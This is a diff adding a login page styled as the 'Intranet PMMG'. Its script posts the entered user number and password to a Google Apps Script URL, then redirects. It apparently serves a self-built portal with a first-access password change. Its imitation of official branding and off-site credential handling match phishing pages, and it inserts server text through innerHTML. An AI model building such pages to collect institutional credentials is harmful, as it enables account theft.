@@ -1,0 +1,222 @@
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    
+    /* Container principal ocupando todo o espaço disponível */
+    .container {
+        display: flex;
+        width: 100%;
+        min-height: 600px; /* Altura mínima para o iframe do Google Sites */
+        height: 100vh;
+        background-color: #121212;
+    }
+
+    /* Lado esquerdo: O Banner Promocional */
+    .banner-side {
+        flex: 6; /* Ocupa 60% da tela */
+        /* ATENÇÃO: Substitua o link abaixo pelo link da sua imagem com o PM e o QR Code */
+        background: url('https://i.postimg.cc/Hxxp8xDK/8.png') center center;
+        background-size: cover;
+        background-repeat: no-repeat;
+    }
+
+    /* Lado direito: O Painel de Login Escuro */
+    .login-side {
+        flex: 4; /* Ocupa 40% da tela */
+        background-color: #111111;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        position: relative;
+    }
+
+    /* Faixa dourada no topo com o logo sobreposto */
+    .header-gold {
+        width: 100%;
+        height: 50px;
+        background-color: #111111;
+        border-top: 15px solid #bd9b60; /* Dourado PMMG */
+        position: absolute;
+        top: 0;
+    }
+
+    .logo {
+        width: 70px;
+        position: absolute;
+        top: 5px;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 10;
+    }
+
+    /* Área do formulário */
+    .form-wrapper {
+        width: 80%;
+        max-width: 350px;
+        margin-top: 120px; /* Espaço para a faixa e o logo */
+    }
+
+    h2 {
+        color: white;
+        font-size: 18px;
+        margin-bottom: 30px;
+        font-weight: 500;
+    }
+
+    .input-group {
+        position: relative;
+        margin-bottom: 20px;
+    }
+
+    /* Ícones dentro do input simulados com texto para não depender de bibliotecas externas */
+    .input-icon {
+        position: absolute;
+        left: 15px;
+        top: 12px;
+        color: #777;
+        font-size: 14px;
+    }
+
+    .input-field {
+        width: 100%;
+        background-color: transparent;
+        border: 1px solid #333;
+        border-radius: 4px;
+        padding: 12px 10px 12px 40px;
+        color: white;
+        font-size: 14px;
+        transition: border 0.3s;
+    }
+
+    .input-field:focus {
+        border-color: #bd9b60;
+        outline: none;
+    }
+
+    .action-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 10px;
+    }
+
+    .btn-entrar {
+        background-color: #e5c98d;
+        color: #111;
+        font-weight: bold;
+        padding: 10px 30px;
+        border: none;
+        border-radius: 20px;
+        cursor: pointer;
+        font-size: 14px;
+        transition: 0.2s;
+    }
+
+    .btn-entrar:hover {
+        background-color: #cbb075;
+    }
+
+    .link-senha {
+        color: #888;
+        text-decoration: none;
+        font-size: 12px;
+    }
+
+    .link-senha:hover {
+        color: white;
+    }
+
+    #mensagemErro {
+        color: #ff4d4d;
+        font-size: 13px;
+        margin-bottom: 15px;
+        display: none;
+        text-align: left;
+    }
+
+    /* Responsividade para telas menores (Celulares) */
+    @media (max-width: 768px) {
+        .container { flex-direction: column; }
+        .banner-side { flex: 4; min-height: 250px; background-position: top; }
+        .login-side { flex: 6; width: 100%; }
+        .form-wrapper { margin-top: 80px; }
+    }
+</style>
+
+<div class="container">
+    <div class="banner-side"></div>
+    <div class="login-side">
+        <div class="header-gold"></div>
+        <img src="https://i.postimg.cc/x8VnxPNy/ESCUDO-EFAS.png" class="logo" alt="Logo">
+        
+        <div class="form-wrapper">
+            <h2>Intranet PMMG</h2>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <span class="input-icon">👤</span>
+                    <input type="text" id="npm" class="input-field" placeholder="Usuário (NPM)" required>
+                </div>
+                
+                <div class="input-group">
+                    <span class="input-icon">🔒</span>
+                    <input type="password" id="senha" class="input-field" placeholder="Senha" required>
+                </div>
+
+                <div id="mensagemErro"></div>
+
+                <div class="action-row">
+                    <button type="submit" id="btnSubmit" class="btn-entrar">Entrar</button>
+                    <a href="#" class="link-senha">Esqueci minha senha</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault(); 
+        
+        var btn = document.getElementById('btnSubmit');
+        var msgErro = document.getElementById('mensagemErro');
+        var npm = document.getElementById('npm').value;
+        var senha = document.getElementById('senha').value;
+
+        btn.innerHTML = 'Aguarde...';
+        btn.style.backgroundColor = '#666';
+        msgErro.style.display = 'none';
+
+        // ATENÇÃO: COLOQUE A URL DO SEU APPS SCRIPT AQUI
+        var scriptURL = "https://script.google.com/macros/s/AKfycbxA7OvS5zheDMHYv7VlMPN-fVDAFpGXllcQaoGosHqw-oaHwicJ2e7dPaRC_Q4fhnZW/exec";
+
+        var formData = new URLSearchParams();
+        formData.append('acao', 'login');
+        formData.append('npm', npm);
+        formData.append('senha', senha);
+
+        fetch(scriptURL, { method: 'POST', body: formData })
+        .then(response => response.json())
+        .then(data => {
+            if(data.status === 'sucesso') {
+                btn.innerHTML = 'Aprovado';
+                btn.style.backgroundColor = '#4CAF50';
+                window.location.href = data.url; 
+            } else if (data.status === 'primeiro_acesso') {
+                btn.innerHTML = 'Aviso';
+                btn.style.backgroundColor = '#bd9b60';
+                window.location.href = data.url; // Redireciona para atualizar senha
+            } else {
+                btn.innerHTML = 'Entrar';
+                btn.style.backgroundColor = '#e5c98d';
+                msgErro.innerHTML = data.mensagem;
+                msgErro.style.display = 'block';
+            }
+        })
+        .catch(error => {
+            btn.innerHTML = 'Entrar';
+            btn.style.backgroundColor = '#e5c98d';
+            msgErro.innerHTML = 'Erro de rede. Verifique a conexão.';
+            msgErro.style.display = 'block';
+        });
+    });
+</script>
